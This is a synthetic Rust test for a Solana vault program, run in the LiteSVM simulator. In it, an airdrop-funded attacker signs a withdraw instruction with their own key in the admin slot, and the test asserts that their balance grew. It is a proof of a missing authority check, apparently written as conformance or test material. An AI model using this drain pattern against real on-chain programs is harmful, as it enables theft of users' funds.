// Conformance scenario "vault drain", Rust (LiteSVM). Synthetic.
// The admin initialises the vault in setup; a separate fee payer pays every
// transaction; the attacker is funded by an airdrop (the mutation), signs the
// withdrawal (the exploit), and the test asserts its balance grew.
use litesvm::LiteSVM;
use solana_sdk::instruction::Instruction;
use solana_sdk::pubkey::Pubkey;
use solana_sdk::signature::{Keypair, Signer};
use solana_sdk::transaction::Transaction;

#[test]
fn attacker_drains_the_vault() {
    let mut svm = LiteSVM::new();
    let fee_payer = Keypair::new();
    let admin = Keypair::new();
    let attacker = Keypair::new();
    svm.airdrop(&fee_payer.pubkey(), 10_000_000_000).unwrap();
    svm.airdrop(&attacker.pubkey(), 1_000_000).unwrap();

    let init = initialize_ix(&admin.pubkey());
    let tx = Transaction::new_signed_with_payer(
        &[init],
        Some(&fee_payer.pubkey()),
        &[&fee_payer, &admin],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let before = svm.get_balance(&attacker.pubkey()).unwrap();
    let drain = withdraw_ix(&attacker.pubkey());
    let tx = Transaction::new_signed_with_payer(
        &[drain],
        Some(&fee_payer.pubkey()),
        &[&fee_payer, &attacker],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    let after = svm.get_balance(&attacker.pubkey()).unwrap();
    assert!(after > before);
}

fn initialize_ix(admin: &Pubkey) -> Instruction {
    Instruction::new_with_bytes(vault::ID, &[0], vec![admin_meta(admin)])
}

fn withdraw_ix(user: &Pubkey) -> Instruction {
    Instruction::new_with_bytes(vault::ID, &[1], vec![admin_meta(user)])
}
